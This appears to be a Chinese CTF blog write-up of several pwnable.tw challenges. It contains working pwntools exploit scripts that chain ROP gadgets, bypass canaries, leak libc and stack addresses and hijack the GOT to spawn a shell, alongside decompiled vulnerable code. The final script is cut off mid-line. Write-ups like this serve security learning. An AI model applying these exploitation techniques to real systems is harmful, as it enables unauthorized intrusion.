<p>先是让rbx储存fini_array的地址，然后通过rbp调用虚表中的函数，rbp不再指向栈帧而是指向了一个可以写的地址，那我们就可以利用rbp，把rbp的值赋值给rsp,我在ropper上面搜了，没有可以直接赋值的gadget,我在这里又卡住了，翻看了别人的wp发现竟然是用leave_ret进行赋值，妙👌leave_ret其实可以拆分成’mov rsp,rbp;pop rbp,ret’,完美把rbp赋值给rsp,当执行ret的时候rsp指向了fini_array[1],只要让fini_array[1]储存ret,那rsp又指向了fini_array+0x10,这个地址不属于fini_array且能写，只要向这里写入rop就完成攻击了。</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10105</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x401BC1&#x27;)</span></span><br><span class="line">fini_arrray=<span class="number">0x00000000004B40F0</span></span><br><span class="line">pop_rax=<span class="number">0x000000000041e4af</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401696</span> </span><br><span class="line">pop_rsi=<span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx=<span class="number">0x0000000000446e35</span></span><br><span class="line">leavel_ret=<span class="number">0x401C4B</span></span><br><span class="line">rop_addr=<span class="number">0x4B4100</span></span><br><span class="line">main=<span class="number">0x401B6D</span></span><br><span class="line">libc_cus_fini=<span class="number">0x402960</span></span><br><span class="line">binsh_addr=<span class="number">0x4b4000</span></span><br><span class="line">syscall=<span class="number">0x0000000000471db5</span></span><br><span class="line">ret=<span class="number">0x0000000000401016</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;addr:&#x27;</span>,timeout=<span class="number">10000</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(addr))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;data:&quot;</span>,timeout=<span class="number">10000</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    write_addr(fini_arrray,p64(libc_cus_fini)+p64(main))</span><br><span class="line">    write_addr(binsh_addr,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    write_addr(rop_addr,p64(pop_rax))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">2</span>,p64(pop_rdi))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">3</span>,p64(binsh_addr))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">4</span>,p64(pop_rsi))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">5</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">6</span>,p64(pop_rdx))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line">    write_addr(rop_addr+<span class="number">0x8</span>*<span class="number">8</span>,p64(syscall))</span><br><span class="line">    write_addr(fini_arrray,p64(leavel_ret)+p64(ret))</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>可惜的是可能我的vpn不是太好，跑远程的老是不行。</p>
<h2 id="doublesort"><a href="#doublesort" class="headerlink" title="doublesort"></a>doublesort</h2><p>保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/get-shell/pwnable.tw/doublesort/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>就是栈溢出主要是避免canary,通过这道题又学了一招，当scanf在缓存区拿值时检测到是非法字符并不会储存到对应地址，而是直接退出，所以只要构造非法字符就跳过对canary的覆盖就好了，不过不是任意字符，比如当出现’a’时它检测到’a’非法于是直接退出，这样一来’a’还是留在缓存区了，下次还是’a’,只有’+’或者’-‘时既会退出又更新了缓存区。</p>
<p>最后的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_offset=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offfset=libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_offset)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh_offfset)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x3a819 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x34] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5f065 execl(&quot;/bin/sh&quot;, eax)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  eax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5f066 execl(&quot;/bin/sh&quot;, [esp])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=[<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b read&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;What your name :&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1b</span>+<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;aaab&#x27;</span>)</span><br><span class="line">    libc_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">0x1b1244</span></span><br><span class="line">    system=system_offset+libc_addr</span><br><span class="line">    binsh=binsh_offfset+libc_addr</span><br><span class="line">    elf_addr=u32(sh.recv(<span class="number">4</span>))-<span class="number">0x601</span></span><br><span class="line">    canary=elf_addr+<span class="number">0xb2b</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;How many numbers do you what to sort :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">35</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(system))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;number : &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(binsh))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>我sb了，32位系统函数地址后跟着的是返回地址，并不直接是参数，这个卡了快两个小时，64位的题做多了。</p>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>这道题我之前做过，翻我博客应该能看见，就不做了。</p>
<h2 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver bullet"></a>silver bullet</h2><p>这道题在最近一次比赛中见过，漏洞差不多，但攻击程序的方式不太一样，之前那道题就是利用stncat拷贝字节后会再添加一个\x00,这样就能越界覆盖了，然后那道题还给了一个libc地址和任意写，直接打exit_hook了，这道题只有strncat，但是没有canary保护，我现在的思路就是直接栈溢出完成攻击</p>
<p>成功了，这是脚本，我觉得这道题比calc要简单多了，不知道为啥还没有calc做出来的多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_silver</span>(<span class="params">context</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Give me your description of bullet :&#x27;</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power_up</span>(<span class="params">context</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Give me your another description of bullet :&#x27;</span>)</span><br><span class="line">    sh.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x08048A18&#x27;</span>)</span><br><span class="line">    create_silver(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">    power_up(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;\xff\xff\xff&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(puts_plt)+p32(<span class="number">0x08048954</span>)+p32(puts_got)</span><br><span class="line">    power_up(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">    libc_base=u32(sh.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="comment">#print hex(libc_base)</span></span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    create_silver(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">    power_up(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;\xff\xff\xff&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system)+p32(<span class="number">0x08048954</span>)+p32(binsh)</span><br><span class="line">    power_up(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="appstore"><a href="#appstore" class="headerlink" title="appstore"></a>appstore</h2><p>看懂程序的整个流程看了快一个小时吧，看懂后找见了漏洞但是不知道怎么利用，又卡了好久，最后想不出来看别的wp了。</p>
<p>看完wp后慢脑子都是秒啊😃😃，竟然是利用ebp进行got写，未曾设想过得道理。</p>
<p>保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以写got表还不开pie.</p>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2[<span class="number">5</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;*: iPhone 8 - $1&quot;</span>);</span><br><span class="line">    asprintf(v2, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;iPhone 8&quot;</span>);</span><br><span class="line">    v2[<span class="number">1</span>] = (<span class="keyword">char</span> *)<span class="number">1</span>;</span><br><span class="line">    insert((<span class="keyword">int</span>)v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Total: $%d\n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Want to checkout? Maybe next time!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当所购物品总价等于7174时，没有用堆记录节点并链接到链表上，而是把信息记录在栈上面，堆上的信息我们不可能改写，但是栈上的数据是可能的啊,如果能改写这个节点信息，那就可以干好多事了。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int cart()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v2; // [esp+18h] [ebp-30h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int i; // [esp+20h] [ebp-28h]</span><br><span class="line">  char buf[22]; // [esp+26h] [ebp-22h] BYREF</span><br><span class="line">  unsigned int v6; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  v2 = 1;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(buf, 0x15u);</span><br><span class="line">  if ( buf[0] == 121 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;==== Cart ====&quot;);</span><br><span class="line">    for ( i = *(_DWORD *)&amp;byte_804B070; i; i = *(_DWORD *)(i + 8) )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *(const char **)i, *(_DWORD *)(i + 4));</span><br><span class="line">      v3 += *(_DWORD *)(i + 4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>handler的所有分支函数的ebp都是不变的，在checkout函数中节点离ebp0x20,在其他函数中比如上面这个，buf离ebp0x22,离节点只差0x2个字节，那就可以利用Buf来改写节点信息</p>
<p>可以通过改写节点信息leak地址，我以前只会leak出libc的地址和elf的地址，没想到还能leak栈地址，在libc的environ中就记录着一个栈地址，利用这个栈地址就可以推出所以栈地址了。</p>
<p>leak完地址就该控制程序流了，可惜的是这道题不能直接改got表，脱链操作是双向的，system那块地址不能写，那该怎么控制程序流呢，这道题最妙的地方来了😊，先是利用栈地址把ebp改成atoi_got+0x22,然后退出del程序，然后ebp就指向了atoi_got了，然后程序根据ebp的值为索引进行写操作,如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">22</span>]; <span class="comment">// [esp+16h] [ebp-22h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    my_read(nptr, <span class="number">0x15</span>u);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(nptr) )</span><br></pre></td></tr></table></figure>

<p>此时nptr就指向了atoi_got,实际上就是向atoi_got中写入数据，我们写个system+’;/bin/sh’岂不是妙哉</p>
<p>下面是完整代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_apple</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Device Number&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x08048A13&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        buy_apple(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">        buy_apple(<span class="number">2</span>)</span><br><span class="line">    buy_apple(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;y\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y\x00&#x27;</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;27: &#x27;</span>)</span><br><span class="line">    libc_base=u32(sh.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    environ_addr=libc_base+libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Let me check your cart. ok? (y/n) &gt; &#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;y\x00&#x27;</span>+p32(environ_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;27: &#x27;</span>)</span><br><span class="line">    ebp=u32(sh.recv(<span class="number">4</span>))-<span class="number">260</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(ebp)</span><br><span class="line"></span><br><span class="line">    atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(atoi_got)</span><br><span class="line">    payload=<span class="built_in">str</span>(<span class="number">27</span>)+p64(<span class="number">0</span>)+p32(atoi_got+<span class="number">0x22</span>)+p32(ebp-<span class="number">8</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item Number&gt; &#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span 